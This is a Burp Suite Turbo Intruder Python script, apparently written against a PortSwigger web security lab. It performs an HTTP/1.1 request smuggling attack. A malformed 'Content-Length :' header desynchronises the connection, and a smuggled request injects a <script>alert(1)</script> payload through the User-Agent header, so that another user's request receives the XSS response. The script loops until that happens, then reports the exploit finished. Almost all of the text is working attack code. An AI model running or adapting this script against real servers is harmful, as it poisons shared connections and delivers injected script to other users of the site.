# Refer to https://portswigger.net/research/http1-must-die
# nu11secur1ty 2025
# Burp POST body smuggling Intruder script

stop_attack = False

def queueRequests(target, wordlists):
    global stop_attack

    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=1,
        engine=Engine.BURP,
        maxRetriesPerRequest=0,
        timeout=15
    )

    kurnabiva1 = '''POST /resources/images/avatarDefault.svg HTTP/1.1
Host: '''+host+'''
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length : %s

'''

    smuggled = '''GET /post?postId=7 HTTP/1.1
User-Agent: yu5md"><script>alert(1)</script>hgpov
user-agent: yu5md"><script>alert(1)</script>hgpov
X: Y'''

    kurnabiva2_chopped = '''GET / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
X: Y'''

    kurnabiva2_revealed = '''GET /404 HTTP/1.1
Host: '''+host+'''
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''

    victim = '''GET / HTTP/1.1
Host: '''+host+'''
User-Agent: foo

'''

    if '%s' not in kurnabiva1:
        raise Exception('Please place %s in the Content-Length header value')

    if not kurnabiva1.endswith('\r\n\r\n'):
        raise Exception('kurnabiva1 request must end with a blank line and have no body')

    while True:
        if stop_attack: break
        engine.queue(kurnabiva1, len(kurnabiva2_chopped), label='kurnabiva1', fixContentLength=False)
        if stop_attack: break
        engine.queue(kurnabiva2_chopped + kurnabiva2_revealed + smuggled, label='kurnabiva2')
        if stop_attack: break
        engine.queue(victim, label='victim')
        if stop_attack: break

def handleResponse(req, interesting):
    global stop_attack
    table.add(req)

    # Stop attack immediately after XSS is triggered
    if req.label == 'victim' and 'hgpov' in req.response:
        stop_attack = True
        print("[+] Done, your exploit is finished!")
